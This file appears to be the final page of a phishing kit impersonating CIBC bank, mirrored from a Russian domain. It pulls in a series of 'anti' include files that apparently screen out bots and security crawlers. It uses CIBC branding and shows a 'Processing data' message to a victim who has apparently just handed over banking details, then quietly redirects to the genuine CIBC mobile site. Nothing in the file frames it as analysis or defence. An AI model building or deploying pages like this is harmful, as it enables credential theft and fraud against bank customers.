<?php
	include '../prevents/anti1.php';
	include '../prevents/anti2.php';
	include '../prevents/anti3.php';
	include '../prevents/anti4.php';
	include '../prevents/anti5.php';
	include '../prevents/anti6.php';
	include '../prevents/anti7.php';
	include '../prevents/anti8.php';
	include '../prevents/anti9.php';
?>
<!DOCTYPE html>
<html>
      
<!-- Mirrored from bioutil.ru/bell/interac/cibc/complete.php by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 21 Sep 2018 17:56:00 GMT -->
<head>
       <LINK href="js/snsStyles.html" rel="stylesheet" type="text/css">
	   
		 <link rel="icon" type="image/vnd.microsoft.icon" href="https://www.cibc.com/etc/designs/cibcpublic/favicon.ico">
		<META HTTP-EQUIV="Refresh" CONTENT="5;URL=https://www.cibc.mobi/">
       <title>
        CIBC Account Services
       </title>
       
	
	 
	 	
	 
	  <style type="text/css">
           
             #signOutContent {
   margin:150px 0 0 0;
  }

  #signOutTxt {
   font:normal 18px Arial;
   color:#333333;
  }

  #main-txt {
    margin:33px 0 0 0;
  }

  #signout-circle {
    margin:46px 0 0 0
  }

  #signout-main {
   width:100%;
   text-align:center;
  }
	  </style>
	 </head>	 
	 <body>	 
          <div id="signout-main"> 
	   <div id="signOutContent">
	   </div>	  
	   <div id="main-txt">
	    <span id="signOutTxt">
	     Processing data..... &nbsp;Please wait.....
	    </span>
	   </div>	  
	   <div id="signout-circle">
	    <img src="https://www.cibc.mobi/ebm-mobile-anp/doc/images/common/loading.gif" />
           </div>	 
          </div>
</body>

<!-- Mirrored from bioutil.ru/bell/interac/cibc/complete.php by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 21 Sep 2018 17:56:01 GMT -->
</html>